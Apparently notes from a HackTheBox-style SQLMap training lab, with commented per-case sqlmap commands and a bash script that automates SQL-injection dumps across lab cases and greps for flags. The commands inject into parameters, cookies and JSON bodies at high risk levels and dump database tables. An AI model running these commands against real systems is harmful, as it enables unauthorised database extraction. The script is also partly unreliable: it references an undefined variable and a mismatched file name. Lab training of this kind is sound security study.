#####Running SQLMap on an HTTP Request
#
### case 1
#
#	Traverse to target host. navigate to case 1. Copy target host URL. Run the command. Flag located.
#
#	Command: sqlmap 'http://[TARGET]/case1.php?id=1*' --batch --dump
#
### case 2 (question 1)
#
# Go to the target host and inspect network traffic. Navigate to case 2. Copy the first get request as a curl option. Change curl to sqlmap and append with "--batch" AND "--dump". Flag located
#
#	Command:
#		sqlmap 'http://[TARGET]/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://[TARGET]/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://[TARGET]' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'id=1*' --batch --dump
#	
### case 3 (question 2)
#Go to target host and inspect traffic. Go to case 3.
#	Command:
#		sqlmap -u http://[TARGET]/case3.php --cookie='id=1*' --method PUT --batch --dump
### case 4 (question 3)
#
#	Go to target host and inspect network traffic. Go to case 4. Copy post request request headers and copy into a text file. Copy post request value, as raw, contents in request tab.
#
#	File req.txt contents:
#[
#		POST /case4.php HTTP/1.1
#		Host: [TARGET]
#		User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
#		Accept: */*
#		Accept-Language: en-US,en;q=0.5
#		Accept-Encoding: gzip, deflate
#		Referer: http://[TARGET]/case4.php
#		Content-Type: application/json
#		Content-Length: 8
#		Origin: http://[TARGET]
#		DNT: 1
#		Connection: keep-alive
#		Sec-GPC: 1
#		Pragma: no-cache
#		Cache-Control: no-cache
#		{"id":1}
#]
#
#	Command:
#		sqlmap -r req.text --batch --dump
#
###case 5
#
#sqlmap -u 'http://$TGTHOST/case5.php?id=*' --dump --batch -t flag5 --no-cast --random-agent --level 5 --risk 3 --technique=BEU --dbms=MySQL --method=GET
#
###case 6
#
#sqlmap -u 'http://$TGTHOST/case6.php?col=id' --dump --batch -t flag6 --random-agent --level 5 --risk 3 --dbms=MySQL --method=GET -v 3 --prefix="\`)"
###case 7
#
###case 8
#
###case 9
#
###case 10
#
###case 11
#
#####Master output (bash) shell script:
	#!/bin/bash

	#shorthand
	OUTLOG='/home/'$USER'/Documents/'$(date +%s)'.txt'
	touch $OUTLOG
	echo -e "output log file with location " $OUTLOG
	#exludes info of status updates for cracking
#	OUTFILE=" | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG"

	# Get target info from user
	echo -e "Enter Target host, with port :, without protocol: "
	read UINHOST
	echo -e "Enter Protocol (http or https) "
	read UINPROTO
	TGTHOST="$UINPROTO://$UINHOST"
	TGTHOST="$TGTHOST"
	echo -e "Target host set to" $TGTHOST

	# check if sqlmap is installed
	echo -e "Checking if SQLmap is installed"

	if [ $(dpkg-query -W -f='${Status}' sqlmap 2>/dev/null | grep -c "ok installed") -eq 0 ];
	then
	  echo -e "SQLmap not installed, trying to install now" && apt-get install sqlmap -y;
	fi

	# check if paths exists
#	if [ -d "$OUTLOG" ];
#	then
#	  (echo 'path: '$OUTLOG' exists');
#	  else (touch $OUTLOG && echo -e "making directory: " $OUTLOG);
#	fi

	SQMIN='sqlmap --batch --dump -D testdb --dbms=MySQL --random-agent -u '$TGTHOST
	echo -e "SQMIN = " $SQMIN

	#main commands
	CS1="$SQMIN/case1.php?id=1* -t flag1"
	echo -e 'running case 1: ' $CS1
	$CS1 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS2="$SQMIN/case2.php --compressed --method POST --data-raw 'id=1*' -T flag2"
	echo -e 'running case 2: ' $CS2
	$CS2 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS3="$SQMIN/case3.php -T flag3 --cookie='id=1*' --method PUT"
	echo -e 'running case 3: ' $CS3
	$CS3 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS4="$SQMIN/case4.php -T flag4"
	echo -e 'running case 4: ' $CS4
	$CS4 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS5="$SQMIN/case5.php?id=* -T flag5 --no-cast --level 5 --risk 3 --technique=BEU --method=GET"
	echo -e 'running case 5: ' $CS5
	$CS5 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS6="$SQLMIN/case6.php?col=id -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix='\`)'"
	echo -e 'running case 6: ' $CS6
	$CS6 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS7="$SQLMIN/case7.php -T flag7"
	echo -e 'running case 7: ' $CS7
	$CS7 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS8="$SQLMIN/case8.php -T flag8"
	echo -e 'running case 8: ' $CS8
	$CS8 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS9="$SQLMIN/case9.php -T flag9"
	echo -e 'running case 9: ' $CS9
	$CS9 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS10="$SQLMIN/case10.php -T flag10"
	echo -e 'running case 10: ' $CS10
	$CS10 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG

	CS11="$SQLMIN/case11.php -T flag11"
	echo -e 'running case 11: ' $CS11
	$CS11 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
	sleep 10
	echo -e 'outputting all logs to: ' $OUTLOG
	echo -e 'all flags: '
	cat $OUTLOG | grep -i -E '(HTB\{.+\})'
